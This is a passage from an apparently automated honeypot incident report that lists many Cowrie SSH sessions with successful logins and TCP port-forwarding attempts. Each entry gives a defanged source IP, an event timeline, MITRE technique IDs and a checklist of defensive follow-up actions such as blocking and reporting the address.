**Recommended Actions:**
- [ ] Submit `45.154.244[.]193` to AbuseIPDB if not already reported
- [ ] Block `45.154.244[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7581f394189

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 15:59 |
| **Last Seen** | 2026-08-23 15:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:59:29` | `cowrie.session.connect` |
| `2026-08-23 15:59:29` | `cowrie.client.version` |
| `2026-08-23 15:59:29` | `cowrie.client.kex` |
| `2026-08-23 15:59:30` | `cowrie.login.success` |
| `2026-08-23 15:59:30` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:59:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:59:31` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5545be2d7bcd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 15:59 |
| **Last Seen** | 2026-08-23 15:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:59:33` | `cowrie.session.connect` |
| `2026-08-23 15:59:33` | `cowrie.client.version` |
| `2026-08-23 15:59:33` | `cowrie.client.kex` |
| `2026-08-23 15:59:34` | `cowrie.login.success` |
| `2026-08-23 15:59:34` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:59:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:59:34` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-998cbfc8786f

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-08-23 16:03 |
| **Last Seen** | 2026-08-23 16:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:03:16` | `cowrie.session.connect` |
| `2026-08-23 16:03:16` | `cowrie.client.version` |
| `2026-08-23 16:03:16` | `cowrie.client.kex` |
| `2026-08-23 16:03:18` | `cowrie.login.success` |
| `2026-08-23 16:03:19` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-128284e4db98

| Field | Detail |
|---|---|
| **Source IP** | `128.185.12[.]179` |
| **First Seen** | 2026-08-23 16:03 |
| **Last Seen** | 2026-08-23 16:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:03:25` | `cowrie.session.connect` |
| `2026-08-23 16:03:26` | `cowrie.client.version` |
| `2026-08-23 16:03:26` | `cowrie.client.kex` |
| `2026-08-23 16:03:30` | `cowrie.login.success` |
| `2026-08-23 16:03:30` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.185.12[.]179` to AbuseIPDB if not already reported
- [ ] Block `128.185.12[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da3f6f82fb9d

| Field | Detail |
|---|---|
| **Source IP** | `218.202.143[.]68` |
| **First Seen** | 2026-08-23 16:03 |
| **Last Seen** | 2026-08-23 16:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:03:28` | `cowrie.session.connect` |
| `2026-08-23 16:03:29` | `cowrie.client.version` |
| `2026-08-23 16:03:29` | `cowrie.client.kex` |
| `2026-08-23 16:03:31` | `cowrie.login.success` |
| `2026-08-23 16:03:33` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.202.143[.]68` to AbuseIPDB if not already reported
- [ ] Block `218.202.143[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43013cd81e0e

| Field | Detail |
|---|---|
| **Source IP** | `191.210.73[.]33` |
| **First Seen** | 2026-08-23 16:03 |
| **Last Seen** | 2026-08-23 16:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:03:38` | `cowrie.session.connect` |
| `2026-08-23 16:03:39` | `cowrie.client.version` |
| `2026-08-23 16:03:39` | `cowrie.client.kex` |
| `2026-08-23 16:03:41` | `cowrie.login.success` |
| `2026-08-23 16:03:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:03:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.210.73[.]33` to AbuseIPDB if not already reported
- [ ] Block `191.210.73[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b6c141a1fad

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-08-23 16:04 |
| **Last Seen** | 2026-08-23 16:05 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:04:58` | `cowrie.session.connect` |
| `2026-08-23 16:05:00` | `cowrie.client.version` |
| `2026-08-23 16:05:00` | `cowrie.client.kex` |
| `2026-08-23 16:05:04` | `cowrie.login.success` |
| `2026-08-23 16:05:07` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:05:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-876aee0e3d66

| Field | Detail |
|---|---|
| **Source IP** | `121.180.27[.]195` |
| **First Seen** | 2026-08-23 16:05 |
| **Last Seen** | 2026-08-23 16:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:05:12` | `cowrie.session.connect` |
| `2026-08-23 16:05:13` | `cowrie.client.version` |
| `2026-08-23 16:05:13` | `cowrie.client.kex` |
| `2026-08-23 16:05:15` | `cowrie.login.success` |
| `2026-08-23 16:05:16` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.180.27[.]195` to AbuseIPDB if not already reported
- [ ] Block `121.180.27[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c78cf411ac5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 16:08 |
| **Last Seen** | 2026-08-23 16:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:08:56` | `cowrie.session.connect` |
| `2026-08-23 16:08:56` | `cowrie.client.version` |
| `2026-08-23 16:08:56` | `cowrie.client.kex` |
| `2026-08-23 16:08:57` | `cowrie.login.success` |
| `2026-08-23 16:08:57` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:08:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 16:08:57` | `cowrie.direct-tcpip.data` |
| `2026-08-23 16:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb36a7d6a591

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 16:09 |
| **Last Seen** | 2026-08-23 16:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:09:00` | `cowrie.session.connect` |
| `2026-08-23 16:09:00` | `cowrie.client.version` |
| `2026-08-23 16:09:00` | `cowrie.client.kex` |
| `2026-08-23 16:09:01` | `cowrie.login.success` |
| `2026-08-23 16:09:01` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:09:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 16:09:01` | `cowrie.direct-tcpip.data` |
| `2026-08-23 16:09:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecfef3ab00a6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 16:18 |
| **Last Seen** | 2026-08-23 16:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:18:23` | `cowrie.session.connect` |
| `2026-08-23 16:18:23` | `cowrie.client.version` |
| `2026-08-23 16:18:23` | `cowrie.client.kex` |
| `2026-08-23 16:18:24` | `cowrie.login.success` |
| `2026-08-23 16:18:24` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:18:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 16:18:24` | `cowrie.direct-tcpip.data` |
| `2026-08-23 16:18:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cf0131a770a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 16:18 |
| **Last Seen** | 2026-08-23 16:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:18:26` | `cowrie.session.connect` |
| `2026-08-23 16:18:26` | `cowrie.client.version` |
| `2026-08-23 16:18:26` | `cowrie.client.kex` |
| `2026-08-23 16:18:27` | `cowrie.login.success` |
| `2026-08-23 16:18:27` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:18:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 16:18:28` | `cowrie.direct-tcpip.data` |
| `2026-08-23 16:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fccee636998

| Field | Detail |
|---|---|
| **Source IP** | `60.166.31[.]198` |
| **First Seen** | 2026-08-23 16:20 |
| **Last Seen** | 2026-08-23 16:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:20:36` | `cowrie.session.connect` |
| `2026-08-23 16:20:37` | `cowrie.client.version` |
| `2026-08-23 16:20:37` | `cowrie.client.kex` |
| `2026-08-23 16:20:40` | `cowrie.login.success` |
| `2026-08-23 16:20:41` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.31[.]198` to AbuseIPDB if not already reported
- [ ] Block `60.166.31[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-692cb1ebde82

| Field | Detail |
|---|---|
| **Source IP** | `35.234.169[.]119` |
| **First Seen** | 2026-08-23 16:25 |
| **Last Seen** | 2026-08-23 16:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:25:08` | `cowrie.session.connect` |
| `2026-08-23 16:25:09` | `cowrie.client.version` |
| `2026-08-23 16:25:09` | `cowrie.client.kex` |
| `2026-08-23 16:25:10` | `cowrie.login.success` |
| `2026-08-23 16:25:10` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:25:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.234.169[.]119` to AbuseIPDB if not already reported
- [ ] Block `35.234.169[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-598dc0229fc1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 16:27 |
| **Last Seen** | 2026-08-23 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:27:48` | `cowrie.session.connect` |
| `2026-08-23 16:27:48` | `cowrie.client.version` |
| `2026-08-23 16:27:48` | `cowrie.client.kex` |
| `2026-08-23 16:27:49` | `cowrie.login.success` |
| `2026-08-23 16:27:49` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:27:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 16:27:50` | `cowrie.direct-tcpip.data` |
| `2026-08-23 16:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c664dd3e8ceb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 16:27 |
| **Last Seen** | 2026-08-23 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:27:52` | `cowrie.session.connect` |
| `2026-08-23 16:27:52` | `cowrie.client.version` |
| `2026-08-23 16:27:52` | `cowrie.client.kex` |
| `2026-08-23 16:27:53` | `cowrie.login.success` |
| `2026-08-23 16:27:53` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:27:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 16:27:53` | `cowrie.direct-tcpip.data` |
| `2026-08-23 16:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7cbe70ac62d

| Field | Detail |
|---|---|
| **Source IP** | `175.198.18[.]3` |
| **First Seen** | 2026-08-23 16:30 |
| **Last Seen** | 2026-08-23 16:30 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:30:03` | `cowrie.session.connect` |
| `2026-08-23 16:30:05` | `cowrie.client.version` |
| `2026-08-23 16:30:05` | `cowrie.client.kex` |
| `2026-08-23 16:30:13` | `cowrie.login.success` |
| `2026-08-23 16:30:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.198.18[.]3` to AbuseIPDB if not already reported
- [ ] Block `175.198.18[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5c7fe7ab4e5

| Field | Detail |
|---|---|
| **Source IP** | `47.100.252[.]211` |
| **First Seen** | 2026-08-23 16:30 |
| **Last Seen** | 2026-08-23 16:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:30:21` | `cowrie.session.connect` |
| `2026-08-23 16:30:22` | `cowrie.client.version` |
| `2026-08-23 16:30:22` | `cowrie.client.kex` |
| `2026-08-23 16:30:24` | `cowrie.login.success` |
| `2026-08-23 16:30:25` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.100.252[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.100.252[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9171b70a8f65

| Field | Detail |
|---|---|
| **Source IP** | `216.232.226[.]217` |
| **First Seen** | 2026-08-23 16:35 |
| **Last Seen** | 2026-08-23 16:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:35:51` | `cowrie.session.connect` |
| `2026-08-23 16:35:51` | `cowrie.client.version` |
| `2026-08-23 16:35:51` | `cowrie.client.kex` |
| `2026-08-23 16:35:53` | `cowrie.login.success` |
| `2026-08-23 16:35:53` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:35:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.232.226[.]217` to AbuseIPDB if not already reported
- [ ] Block `216.232.226[.]217` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31d3c1bf5ac9

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-08-23 16:35 |
| **Last Seen** | 2026-08-23 16:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:35:59` | `cowrie.session.connect` |
| `2026-08-23 16:36:00` | `cowrie.client.version` |
| `2026-08-23 16:36:00` | `cowrie.client.kex` |
| `2026-08-23 16:36:02` | `cowrie.login.success` |
| `2026-08-23 16:36:03` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94e5f3da3844

| Field | Detail |
|---|---|
| **Source IP** | `41.90.236[.]3` |
| **First Seen** | 2026-08-23 16:36 |
| **Last Seen** | 2026-08-23 16:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:36:09` | `cowrie.session.connect` |
| `2026-08-23 16:36:09` | `cowrie.client.version` |
| `2026-08-23 16:36:09` | `cowrie.client.kex` |
| `2026-08-23 16:36:11` | `cowrie.login.success` |
| `2026-08-23 16:36:12` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.90.236[.]3` to AbuseIPDB if not already reported
- [ ] Block `41.90.236[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10bdc892e57a

| Field | Detail |
|---|---|
| **Source IP** | `218.25.233[.]22` |
| **First Seen** | 2026-08-23 16:36 |
| **Last Seen** | 2026-08-23 16:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:36:17` | `cowrie.session.connect` |
| `2026-08-23 16:36:18` | `cowrie.client.version` |
| `2026-08-23 16:36:18` | `cowrie.client.kex` |
| `2026-08-23 16:36:20` | `cowrie.login.success` |
| `2026-08-23 16:36:20` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.25.233[.]22` to AbuseIPDB if not already reported
- [ ] Block `218.25.233[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e568f2761de0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 16:37 |
| **Last Seen** | 2026-08-23 16:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:37:21` | `cowrie.session.connect` |
| `2026-08-23 16:37:21` | `cowrie.client.version` |
| `2026-08-23 16:37:22` | `cowrie.client.kex` |
| `2026-08-23 16:37:22` | `cowrie.login.success` |
| `2026-08-23 16:37:23` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:37:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 16:37:23` | `cowrie.direct-tcpip.data` |
| `2026-08-23 16:37:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-344110288f0e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 16:37 |
| **Last Seen** | 2026-08-23 16:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:37:25` | `cowrie.session.connect` |
| `2026-08-23 16:37:25` | `cowrie.client.version` |
| `2026-08-23 16:37:25` | `cowrie.client.kex` |
| `2026-08-23 16:37:26` | `cowrie.login.success` |
| `2026-08-23 16:37:26` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:37:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 16:37:27` | `cowrie.direct-tcpip.data` |
| `2026-08-23 16:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

